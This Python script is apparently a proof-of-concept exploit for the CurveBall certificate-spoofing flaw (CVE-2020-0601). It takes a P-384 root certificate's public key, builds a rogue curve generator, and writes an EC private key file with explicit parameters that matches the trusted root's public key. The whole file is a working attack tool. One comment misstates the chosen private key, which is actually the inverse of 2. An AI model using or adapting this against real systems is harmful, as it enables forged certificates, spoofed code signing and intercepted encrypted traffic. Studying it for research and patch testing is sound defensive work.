#!/usr/bin/env python
import gmpy2
import sys

from fastecdsa.curve import P384
from fastecdsa.point import Point
from Crypto.Util.asn1 import DerSequence, DerOctetString, DerBitString, DerObjectId
from Crypto.IO import PEM
from Crypto.PublicKey import ECC
from binascii import hexlify

def generate_privkey(d, generator):
    """
        Generate a private key with explicit parameters.
    """
    modulus_bytes = 48
    a = P384.a % P384.p
    public_key = d * generator
    generator = (b'\x04' +
        generator.x.to_bytes(modulus_bytes, "big") +
        generator.y.to_bytes(modulus_bytes, "big"))
    public_key = (b'\x04' + 
                    public_key.x.to_bytes(modulus_bytes, "big") +
                    public_key.y.to_bytes(modulus_bytes, "big"))

    field_parameters =  DerSequence([DerObjectId("1.2.840.10045.1.1"), P384.p])
    parameters = [DerSequence([1, field_parameters,
                    DerSequence([
                    DerOctetString(a.to_bytes(modulus_bytes, "big")),
                    DerOctetString(P384.b.to_bytes(modulus_bytes, "big"))]),
                    DerOctetString(generator),
                    P384.q,
                1
            ])]
    seq = [1,
            DerOctetString(d.to_bytes(modulus_bytes, "big")),
            DerSequence(parameters, implicit=0),
            DerBitString(public_key, explicit=1)]
    
    return seq

if __name__ == "__main__":

    if len(sys.argv) != 2:
        print("Usage " + sys.argv[0] + " root-certificate.pem")
        sys.exit()

    # Public key extraction
    cert = open(sys.argv[1], "r")
    pubkey = ECC.import_key(cert.read())
    cert.close()
    nb_bytes = pubkey.pointQ.size_in_bytes()

    if pubkey.curve != "NIST P-384":
        print("Public key must be on P-384 curve")
        sys.exit()

    Q = Point(int(pubkey.pointQ.x), int(pubkey.pointQ.y), curve=P384)

    # Generate rogue generator
    # we take the private key as being 2
    privkey = int(gmpy2.invert(2, P384.q))
    # we multiply our public key Q with the inverse of our chosen private key value
    rogueG = 2 * Q
    der = DerSequence(generate_privkey(privkey, rogueG))
    # Generate new file
    f = open('p384-key-rogue.pem','w')
    keyfile = PEM.encode(der.encode(), 'EC PRIVATE KEY')
    f.write(keyfile)
    f.close()